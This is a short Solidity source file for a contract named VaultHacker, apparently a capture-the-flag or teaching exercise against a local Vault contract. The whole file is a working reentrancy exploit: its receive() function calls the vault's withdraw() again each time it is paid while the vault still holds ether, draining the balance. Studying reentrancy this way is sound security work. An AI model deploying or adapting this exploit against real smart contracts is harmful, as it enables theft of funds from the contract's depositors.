// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";

contract VaultHacker {
    address public owner;
    address payable public vault;

    constructor(address _vault) {
        owner = msg.sender;
        vault = payable(_vault);
    }

    function deposit() external payable {
        require(msg.sender == owner, "Not owner");
        Vault(vault).deposit{value: msg.value}();
    }

    function withdraw() external payable {
        require(msg.sender == owner, "Not owner");
        Vault(vault).withdraw();
    }

    receive() external payable {
        if (vault.balance > 0) {
            Vault(vault).withdraw();
        }
    }
}
